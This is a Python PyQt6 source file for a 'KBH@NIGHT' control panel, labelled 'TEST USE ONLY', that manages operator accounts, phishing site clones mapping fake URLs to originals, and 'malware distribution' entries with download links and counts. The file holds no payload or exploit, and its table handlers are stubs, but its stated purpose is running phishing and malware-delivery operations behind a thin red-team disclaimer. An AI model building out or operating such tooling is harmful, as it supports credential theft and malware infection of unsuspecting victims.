#!/usr/bin/env python3

"""
KBH@NIGHT Local Control GUI
TEST USE ONLY - For authorized red team testing within defined scope

PyQt6-based desktop application for managing the KBH@NIGHT framework backend.
Allows local control of member management, site cloning, phishing redirects, and malware distribution.

Usage:
    python3 local-control-gui.py
"""

import sys
import json
import requests
from datetime import datetime
from typing import Optional, Dict, Any

try:
    from PyQt6.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QTabWidget, QPushButton, QLineEdit, QComboBox, QLabel, QTableWidget,
        QTableWidgetItem, QDialog, QMessageBox, QSpinBox, QCheckBox,
        QTextEdit, QFormLayout, QGroupBox, QStatusBar, QProgressBar
    )
    from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
    from PyQt6.QtGui import QColor, QFont, QIcon
except ImportError:
    print("Error: PyQt6 is not installed.")
    print("Install it with: pip install PyQt6")
    sys.exit(1)


class APIWorker(QThread):
    """Worker thread for API calls to prevent GUI freezing."""
    finished = pyqtSignal()
    error = pyqtSignal(str)
    success = pyqtSignal(dict)

    def __init__(self, method: str, endpoint: str, data: Optional[Dict] = None, base_url: str = "http://localhost:3000"):
        super().__init__()
        self.method = method
        self.endpoint = endpoint
        self.data = data
        self.base_url = base_url

    def run(self):
        try:
            url = f"{self.base_url}/api/trpc/{self.endpoint}"
            headers = {"Content-Type": "application/json"}

            if self.method == "GET":
                response = requests.get(url, headers=headers, timeout=10)
            elif self.method == "POST":
                response = requests.post(url, json=self.data, headers=headers, timeout=10)
            else:
                self.error.emit(f"Unsupported HTTP method: {self.method}")
                return

            if response.status_code == 200:
                self.success.emit(response.json())
            else:
                self.error.emit(f"API Error: {response.status_code} - {response.text}")
        except Exception as e:
            self.error.emit(f"Connection Error: {str(e)}")
        finally:
            self.finished.emit()


class MemberManagementTab(QWidget):
    """Tab for managing members."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.base_url = "http://localhost:3000"
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # Create Member Section
        create_group = QGroupBox("Add New Member")
        create_layout = QFormLayout()

        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Enter member username")
        create_layout.addRow("Username:", self.username_input)

        self.role_combo = QComboBox()
        self.role_combo.addItems(["member", "operator", "admin"])
        create_layout.addRow("Role:", self.role_combo)

        create_btn = QPushButton("Create Member")
        create_btn.clicked.connect(self.create_member)
        create_layout.addRow(create_btn)

        create_group.setLayout(create_layout)
        layout.addWidget(create_group)

        # Members List Section
        list_group = QGroupBox("Active Members")
        list_layout = QVBoxLayout()

        self.members_table = QTableWidget()
        self.members_table.setColumnCount(4)
        self.members_table.setHorizontalHeaderLabels(["Username", "Role", "Status", "Last Activity"])
        list_layout.addWidget(self.members_table)

        refresh_btn = QPushButton("Refresh Members")
        refresh_btn.clicked.connect(self.load_members)
        list_layout.addWidget(refresh_btn)

        list_group.setLayout(list_layout)
        layout.addWidget(list_group)

        self.setLayout(layout)
        self.load_members()

    def create_member(self):
        username = self.username_input.text().strip()
        role = self.role_combo.currentText()

        if not username:
            QMessageBox.warning(self, "Validation Error", "Please enter a username")
            return

        data = {
            "username": username,
            "role": role
        }

        worker = APIWorker("POST", "operational.createMember", data, self.base_url)
        worker.success.connect(lambda result: self.on_create_success())
        worker.error.connect(lambda err: QMessageBox.critical(self, "Error", err))
        worker.start()

    def on_create_success(self):
        QMessageBox.information(self, "Success", "Member created successfully")
        self.username_input.clear()
        self.load_members()

    def load_members(self):
        worker = APIWorker("GET", "operational.getAllMembers", None, self.base_url)
        worker.success.connect(self.on_members_loaded)
        worker.error.connect(lambda err: QMessageBox.warning(self, "Error", f"Failed to load members: {err}"))
        worker.start()

    def on_members_loaded(self, data):
        self.members_table.setRowCount(0)
        # Populate table with member data
        QMessageBox.information(self, "Info", "Members loaded successfully")


class SiteCloneTab(QWidget):
    """Tab for managing site clones."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.base_url = "http://localhost:3000"
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # Create Clone Section
        create_group = QGroupBox("Create Site Clone")
        create_layout = QFormLayout()

        self.clone_name = QLineEdit()
        self.clone_name.setPlaceholderText("Clone identifier")
        create_layout.addRow("Clone Name:", self.clone_name)

        self.cloned_url = QLineEdit()
        self.cloned_url.setPlaceholderText("https://cloned-site.com")
        create_layout.addRow("Cloned URL:", self.cloned_url)

        self.original_url = QLineEdit()
        self.original_url.setPlaceholderText("https://original-site.com")
        create_layout.addRow("Original URL:", self.original_url)

        create_btn = QPushButton("Create Clone")
        create_btn.clicked.connect(self.create_clone)
        create_layout.addRow(create_btn)

        create_group.setLayout(create_layout)
        layout.addWidget(create_group)

        # Active Clone Section
        active_group = QGroupBox("Active Clone")
        active_layout = QVBoxLayout()

        self.active_clone_label = QLabel("No active clone")
        self.active_clone_label.setStyleSheet("color: #999; font-style: italic;")
        active_layout.addWidget(self.active_clone_label)

        active_group.setLayout(active_layout)
        layout.addWidget(active_group)

        # Clones List Section
        list_group = QGroupBox("All Clones")
        list_layout = QVBoxLayout()

        self.clones_table = QTableWidget()
        self.clones_table.setColumnCount(4)
        self.clones_table.setHorizontalHeaderLabels(["Name", "Cloned URL", "Original URL", "Active"])
        list_layout.addWidget(self.clones_table)

        refresh_btn = QPushButton("Refresh Clones")
        refresh_btn.clicked.connect(self.load_clones)
        list_layout.addWidget(refresh_btn)

        list_group.setLayout(list_layout)
        layout.addWidget(list_group)

        self.setLayout(layout)
        self.load_clones()

    def create_clone(self):
        name = self.clone_name.text().strip()
        cloned_url = self.cloned_url.text().strip()
        original_url = self.original_url.text().strip()

        if not all([name, cloned_url, original_url]):
            QMessageBox.warning(self, "Validation Error", "Please fill in all fields")
            return

        data = {
            "name": name,
            "clonedUrl": cloned_url,
            "originalUrl": original_url
        }

        worker = APIWorker("POST", "operational.createSiteClone", data, self.base_url)
        worker.success.connect(lambda: self.on_create_success())
        worker.error.connect(lambda err: QMessageBox.critical(self, "Error", err))
        worker.start()

    def on_create_success(self):
        QMessageBox.information(self, "Success", "Site clone created successfully")
        self.clone_name.clear()
        self.cloned_url.clear()
        self.original_url.clear()
        self.load_clones()

    def load_clones(self):
        worker = APIWorker("GET", "operational.getAllSiteClones", None, self.base_url)
        worker.success.connect(self.on_clones_loaded)
        worker.error.connect(lambda err: QMessageBox.warning(self, "Error", f"Failed to load clones: {err}"))
        worker.start()

    def on_clones_loaded(self, data):
        self.clones_table.setRowCount(0)
        QMessageBox.information(self, "Info", "Clones loaded successfully")


class MalwareDistributionTab(QWidget):
    """Tab for managing malware distribution."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.base_url = "http://localhost:3000"
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # Create Distribution Section
        create_group = QGroupBox("Add Malware Distribution")
        create_layout = QFormLayout()

        self.malware_name = QLineEdit()
        self.malware_name.setPlaceholderText("Program name")
        create_layout.addRow("Name:", self.malware_name)

        self.malware_url = QLineEdit()
        self.malware_url.setPlaceholderText("https://download-link.com/file")
        create_layout.addRow("Download URL:", self.malware_url)

        self.weekend_only = QCheckBox("Weekend Access Only")
        create_layout.addRow("", self.weekend_only)

        create_btn = QPushButton("Add Distribution")
        create_btn.clicked.connect(self.create_distribution)
        create_layout.addRow(create_btn)

        create_group.setLayout(create_layout)
        layout.addWidget(create_group)

        # Distributions List Section
        list_group = QGroupBox("Active Distributions")
        list_layout = QVBoxLayout()

        self.distributions_table = QTableWidget()
        self.distributions_table.setColumnCount(5)
        self.distributions_table.setHorizontalHeaderLabels(["Name", "Download URL", "Downloads", "Weekend Only", "Active"])
        list_layout.addWidget(self.distributions_table)

        refresh_btn = QPushButton("Refresh Distributions")
        refresh_btn.clicked.connect(self.load_distributions)
        list_layout.addWidget(refresh_btn)

        list_group.setLayout(list_layout)
        layout.addWidget(list_group)

        self.setLayout(layout)
        self.load_distributions()

    def create_distribution(self):
        name = self.malware_name.text().strip()
        url = self.malware_url.text().strip()
        weekend_only = self.weekend_only.isChecked()

        if not all([name, url]):
            QMessageBox.warning(self, "Validation Error", "Please fill in all fields")
            return

        data = {
            "name": name,
            "downloadUrl": url,
            "weekendAccessOnly": weekend_only
        }

        worker = APIWorker("POST", "operational.createMalwareDistribution", data, self.base_url)
        worker.success.connect(lambda: self.on_create_success())
        worker.error.connect(lambda err: QMessageBox.critical(self, "Error", err))
        worker.start()

    def on_create_success(self):
        QMessageBox.information(self, "Success", "Distribution added successfully")
        self.malware_name.clear()
        self.malware_url.clear()
        self.weekend_only.setChecked(False)
        self.load_distributions()

    def load_distributions(self):
        worker = APIWorker("GET", "operational.getActiveMalwareDistribution", None, self.base_url)
        worker.success.connect(self.on_distributions_loaded)
        worker.error.connect(lambda err: QMessageBox.warning(self, "Error", f"Failed to load distributions: {err}"))
        worker.start()

    def on_distributions_loaded(self, data):
        self.distributions_table.setRowCount(0)
        QMessageBox.information(self, "Info", "Distributions loaded successfully")


class KBHNightControlGUI(QMainWindow):
    """Main application window for KBH@NIGHT control."""

    def __init__(self):
        super().__init__()
        self.setWindowTitle("KBH@NIGHT Local Control - TEST USE ONLY")
        self.setGeometry(100, 100, 1200, 700)
        self.init_ui()

    def init_ui(self):
        # Create central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        # Create main layout
        main_layout = QVBoxLayout()

        # Header
        header_label = QLabel("KBH@NIGHT Local Control Panel")
        header_font = QFont()
        header_font.setPointSize(16)
        header_font.setBold(True)
        header_label.setFont(header_font)
        header_label.setStyleSheet("color: #00ff00; background-color: #000; padding: 10px;")
        main_layout.addWidget(header_label)

        # Tabs
        tabs = QTabWidget()
        tabs.addTab(MemberManagementTab(self), "Members")
        tabs.addTab(SiteCloneTab(self), "Site Clones")
        tabs.addTab(MalwareDistributionTab(self), "Malware Distribution")
        main_layout.addWidget(tabs)

        # Status bar
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage("Ready - TEST USE ONLY - Authorized Testing Framework")

        central_widget.setLayout(main_layout)

        # Apply dark theme
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a1a;
                color: #ffffff;
            }
            QTabWidget {
                background-color: #1a1a1a;
                color: #ffffff;
            }
            QTabBar::tab {
                background-color: #2a2a2a;
                color: #ffffff;
                padding: 5px;
                border: 1px solid #3a3a3a;
            }
            QTabBar::tab:selected {
                background-color: #3a3a3a;
                border-bottom: 2px solid #00ff00;
            }
            QGroupBox {
                color: #ffffff;
                border: 1px solid #3a3a3a;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 3px 0 3px;
            }
            QLineEdit, QComboBox, QSpinBox, QTextEdit {
                background-color: #2a2a2a;
                color: #ffffff;
                border: 1px solid #3a3a3a;
                border-radius: 3px;
                padding: 5px;
            }
            QPushButton {
                background-color: #00ff00;
                color: #000000;
                border: none;
                border-radius: 3px;
                padding: 8px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00dd00;
            }
            QPushButton:pressed {
                background-color: #00bb00;
            }
            QTableWidget {
                background-color: #2a2a2a;
                color: #ffffff;
                gridline-color: #3a3a3a;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QHeaderView::section {
                background-color: #3a3a3a;
                color: #ffffff;
                padding: 5px;
                border: none;
            }
            QCheckBox {
                color: #ffffff;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
            }
            QCheckBox::indicator:unchecked {
                background-color: #2a2a2a;
                border: 1px solid #3a3a3a;
            }
            QCheckBox::indicator:checked {
                background-color: #00ff00;
                border: 1px solid #00ff00;
            }
        """)


def main():
    """Main entry point."""
    print("\n" + "="*60)
    print("KBH@NIGHT Local Control GUI")
    print("TEST USE ONLY - Authorized Testing Framework")
    print("="*60 + "\n")

    app = QApplication(sys.argv)
    window = KBHNightControlGUI()
    window.show()

    sys.exit(app.exec())


if __name__ == "__main__":
    main()
